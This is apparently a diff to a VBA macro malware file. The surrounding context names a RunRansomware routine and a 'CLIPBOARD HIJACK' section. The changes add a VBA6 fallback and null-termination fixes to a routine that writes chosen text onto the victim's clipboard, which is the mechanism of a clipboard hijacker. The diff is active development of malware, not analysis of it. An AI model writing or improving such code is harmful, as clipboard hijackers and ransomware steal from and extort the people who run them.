@@ -2480,7 +2480,7 @@ Sub RunRansomware()
 End Sub
 
 ' ============================================================
-' 17. CLIPBOARD HIJACK (fixed logic)
+' 17. CLIPBOARD HIJACK (fixed logic, conditional for VBA6)
 ' ============================================================
 Public Sub ClipboardMonitorLoop()
     On Error Resume Next
@@ -2603,21 +2603,34 @@ Sub SetClipboardContent(txt As String)
     Dim pMemAnsi As Long
 #End If
     Dim ansiBytes() As Byte
+    ' Unicode (CF_UNICODETEXT)
     hMem = GlobalAlloc(&H42, (Len(txt) + 1) * 2)
     If hMem Then
         pMem = GlobalLock(hMem)
         If pMem Then
+#If VBA7 Then
             CopyMemory ByVal pMem, ByVal StrPtr(txt), (Len(txt) + 1) * 2
+#Else
+            Dim i As Long
+            For i = 0 To Len(txt) - 1
+                Dim charCode As Integer
+                charCode = AscW(Mid(txt, i + 1, 1))
+                CopyMemory ByVal (pMem + i * 2), charCode, 2
+            Next
+            CopyMemory ByVal (pMem + Len(txt) * 2), 0, 2
+#End If
             GlobalUnlock hMem
             SetClipboardData 13, hMem
         End If
     End If
+    ' ANSI (CF_TEXT)
     ansiBytes = StrConv(txt, vbFromUnicode)
     hMemAnsi = GlobalAlloc(&H42, UBound(ansiBytes) + 2)
     If hMemAnsi Then
         pMemAnsi = GlobalLock(hMemAnsi)
         If pMemAnsi Then
             CopyMemory ByVal pMemAnsi, ansiBytes(0), UBound(ansiBytes) + 1
+            CopyMemory ByVal (pMemAnsi + UBound(ansiBytes) + 1), 0, 1
             GlobalUnlock hMemAnsi
             SetClipboardData 1, hMemAnsi
         End If
